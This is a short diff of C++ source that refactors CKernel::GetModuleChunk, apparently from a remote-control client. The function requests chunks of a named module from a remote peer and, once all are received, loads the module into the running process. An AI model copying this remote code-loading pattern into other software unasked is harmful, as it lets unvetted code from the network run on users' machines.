@@ -180,31 +180,22 @@ void CKernel::OnModuleInfo(char* info){
 #define MAX_CHUNK_SIZE 0x10000
 
 void CKernel::GetModuleChunk(){
-	//
 	if (m_module_size == m_loaded_size){
 		m_pModuleMgr->LoadModule(m_module_buffer, m_module_size);
 		return;
 	}
-
-	// Get Chunk Data:
-
 	// Total Size,checksum, offset,chunk size,
-	size_t size = sizeof(DWORD) * 4 + lstrlenA(m_current_module.c_str()) + 1;
-	char * lpBuffer = (char*)calloc(1, size);
-	DWORD* Packet = (DWORD*)lpBuffer;
-	char * name = lpBuffer + sizeof(DWORD) * 4;
-
 	DWORD LeftSize = m_module_size - m_loaded_size;
-	Packet[0] = m_module_size;
-	Packet[1] = m_checksum;
-	Packet[2] = m_loaded_size;
-	Packet[3] = LeftSize < MAX_CHUNK_SIZE ? LeftSize : MAX_CHUNK_SIZE;
-	
-	lstrcpyA(name, m_current_module.c_str());
 
-	//获取下一个数据块..
-	SendMsg(KNEL_MODULE_CHUNK_GET, lpBuffer, size);
-	free(lpBuffer);
+	if (BeginMsg(KNEL_MODULE_CHUNK_GET)){
+		WriteDword(m_module_size);
+		WriteDword(m_checksum);
+		WriteDword(m_loaded_size);
+		WriteDword(LeftSize < MAX_CHUNK_SIZE ? LeftSize : MAX_CHUNK_SIZE);
+
+		WriteBytes((BYTE*)m_current_module.c_str(), m_current_module.length() + 1);
+		EndMsg();
+	}
 }
 /*******************************************************************************
 			Get Ping
